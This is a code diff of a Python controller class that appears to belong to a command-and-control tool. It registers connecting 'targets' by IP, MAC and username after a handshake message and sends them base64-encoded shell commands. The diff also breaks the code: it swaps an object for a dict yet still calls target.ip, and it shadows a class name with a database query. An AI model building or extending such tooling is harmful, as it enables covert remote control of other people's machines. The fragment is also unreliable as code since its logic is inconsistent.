@@ -23,10 +23,19 @@ class Controller(Host):
     def join(self, shellpack):
         match shellpack['message']:
             case "hello how are you":
-                target = Target(shellpack)
+                target = {
+                    "ip": shellpack['ip'],
+                    "iface": shellpack['iface'],
+                    "mac": shellpack['mac'],
+                    "user": shellpack['user'],
+                    "status": "STANDBY"
+                    }
+
                 self.db.insert(target)
                 self.send(target.ip, "join", "fine thank you")
-                target.update_status("CONNECTED")
+                Target = Query()
+                print(self.db.search(Target.ip == '192.168.157.10'))
+                #self.db.update()
                 self.send(target.ip, "instruction", "request", base64.b64encode("ls -la".encode()))
             case _:
                 print("Invalid join message")
